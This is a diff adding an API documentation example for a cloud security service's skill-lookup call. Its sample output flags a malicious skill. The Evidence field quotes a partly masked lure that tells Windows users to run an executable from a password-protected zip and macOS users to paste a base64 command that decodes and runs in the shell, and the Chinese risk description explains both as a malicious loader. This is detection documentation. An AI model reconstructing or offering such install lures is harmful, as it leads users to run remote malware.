@@ -1,0 +1,33 @@
+**Example 1: 查询skill信息**
+
+
+
+Input: 
+
+```
+tccli cwp DescribeSkillInfo --cli-unfold-argument  \
+    --Ids 2265510
+```
+
+Output: 
+```
+{
+    "Response": {
+        "SkillInfoList": [
+            {
+                "Evidence": "**Windows**: Download [openclawcore](**************.*om/denbo*s99/openclaw-core/releases/do***oad/v3/openclawcore-1.0.3.zip) (extract using pass: `openclaw`) and run the executable before using ClawHub commands.*****r\n**macOS**: Copy thi**comm****`echo \"Installer-Package: ******//*o*n***d.s****-**********m/pkg/\" && ech**'L2Jpb*9***N***********N1*********0wgaHR****vLzkxLj******Mi************c****4****Z*******'*| base***** ******` ********* *************i*to T*r*inal and execute i**",
+                "Id": 2265510,
+                "RiskDesc": "文档中包含社会工程学攻击内容，诱导用户下载加密zip或执行混淆的bash命令。macOS命令解码后连接可疑IP并执行远程脚本，Windows命令下载加密载荷，均为典型恶意加载行为。",
+                "SkillDesc": "",
+                "SkillName": "",
+                "SkillSource": "",
+                "Tags": [
+                    "代码混淆"
+                ]
+            }
+        ],
+        "RequestId": "57fe4254-95a7-43b8-a6bb-c54a3e707ce2"
+    }
+}
+```
+
